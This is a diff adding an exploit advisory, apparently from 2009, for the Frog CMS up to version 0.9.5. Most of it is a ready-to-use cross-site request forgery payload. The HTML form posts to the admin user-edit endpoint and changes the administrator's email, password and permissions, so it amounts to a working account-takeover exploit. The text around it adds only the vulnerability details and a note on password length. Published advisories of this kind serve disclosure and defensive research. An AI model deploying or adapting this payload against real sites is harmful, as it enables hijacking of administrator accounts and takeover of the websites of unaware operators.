@@ -1,0 +1,33 @@
+[-------------------------------------------------------------------------------------------------]
+[   Title: Frog <= 0.9.5 XSRF Vulnerability (Change Admin Password)                               ]
+[   Author: Milos Zivanovic                                                                       ]
+[   Email: milosz.security@gmail.com<mailto:milosz.security@gmail.com>                                                              ]
+[   Date: 13. December 2009.                                                                      ]
+[-------------------------------------------------------------------------------------------------]
+
+[-------------------------------------------------------------------------------------------------]
+[   Application: Frog                                                                             ]
+[   Version: 0.9.5                                                                                ]
+[   Download: http://www.madebyfrog.com/download.html                                             ]
+[   Vulnerability: Cross Site Request Forgery                                                     ]
+[-------------------------------------------------------------------------------------------------]
+
+With this exploit we can alter admins info such as email, password and some permissions.
+NOTE: password must be more then 5 chars.
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/frog/admin/?/user/edit/1" method="POST">
+  <input type="text" name="user[name]" value="Administrator">
+  <input type="text" name="user[email]" value="mail@email.com<mailto:mail@email.com>">
+  <input type="text" name="user[username]" value="admin">
+  <input type="password" name="user[password]" value="hacked">
+  <input type="password" name="user[confirm]" value="hacked">
+  <input type="hidden" name="user_permission[Administrator]" value="1">
+  <input type="hidden" name="user_permission[Developer]" value="2">
+  <input type="hidden" name="user_permission[Editor]" value="3">
+  <input type="submit" name="commit" accesskey="s" value="Save">
+</form>
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[----------------------------------------------EOF------------------------------------------------]
